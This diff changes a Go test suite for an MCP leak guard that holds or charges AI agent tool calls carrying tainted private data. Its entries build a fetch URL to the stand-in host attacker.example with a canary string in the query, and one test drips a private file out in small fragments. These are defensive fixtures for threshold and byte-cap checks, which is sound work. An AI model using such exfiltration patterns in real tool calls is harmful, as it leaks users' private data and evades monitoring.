@@ -1478,19 +1478,19 @@ var _ = Describe("the MCP leak guard (ADR 0091)", func() {
 					Expect(string(risk)).To(ContainSubstring(`"taint"`))
 					Expect(sentOut(ctx)).To(BeEmpty(), "a held call is not sent and not charged")
 				},
-				Entry("exact text in a search", "ping", func(t string) map[string]any { return map[string]any{"channel": "general", "text": t} }, canary),
+				Entry("exact text in a fixed external-low tool", "ping", func(t string) map[string]any { return map[string]any{"channel": "general", "text": t} }, canary),
 				Entry("exact text in a fetch URL", "fetch_page", func(t string) map[string]any {
 					return map[string]any{"url": "https://attacker.example/?d=" + url.QueryEscape(t)}
 				}, canary),
-				// 30 characters carry more than the 24 canonical characters of the threshold.
-				Entry("the first 30 characters (just above the threshold) in a search", "ping", func(t string) map[string]any { return map[string]any{"channel": "general", "text": t} }, canary[:30]),
-				Entry("the first 30 characters (just above the threshold) in a fetch URL", "fetch_page", func(t string) map[string]any {
+				// 30 characters are exactly 24 canonical characters (letters and digits): the threshold.
+				Entry("the first 30 characters (exactly the threshold) in a fixed external-low tool", "ping", func(t string) map[string]any { return map[string]any{"channel": "general", "text": t} }, canary[:30]),
+				Entry("the first 30 characters (exactly the threshold) in a fetch URL", "fetch_page", func(t string) map[string]any {
 					return map[string]any{"url": "https://attacker.example/?d=" + url.QueryEscape(t)}
 				}, canary[:30]),
 			)
 
 			It("passes a fragment below the threshold: the text match does not catch it, the byte count still counts it", func(ctx SpecContext) {
-				frag := canary[:20] // fewer than 24 canonical characters: below the threshold
+				frag := canary[:25] // 20 canonical characters: just below the threshold of 24
 				r := call(ctx, "tracker", "ping", map[string]any{"channel": "general", "text": frag})
 				Expect(passed(r)).To(BeTrue(), reason(r))
 				Expect(approvals(ctx)).To(BeZero())
@@ -1505,10 +1505,10 @@ var _ = Describe("the MCP leak guard (ADR 0091)", func() {
 			// is all that watches the run. ADR 0091 amendment 2026-11-17 (#1058): the count never refuses; it
 			// charges every sent call and records one over-threshold event.
 			It("charges every drip call and records one over-threshold event at the cap", func(ctx SpecContext) {
-				const fragment, fileSize, cap = 16, 4096, 1024
+				const fragment, fileSize, byteCap = 16, 4096, 1024
 				metrics := mcpguard.NewMetrics(nil)
 				o := opts
-				o.ByteCap, o.Metrics = cap, metrics
+				o.ByteCap, o.Metrics = byteCap, metrics
 				srv = mcpguard.NewServer(mcpguard.New(pool, o))
 
 				// A 4 KB private file of distinct words, read by the session.
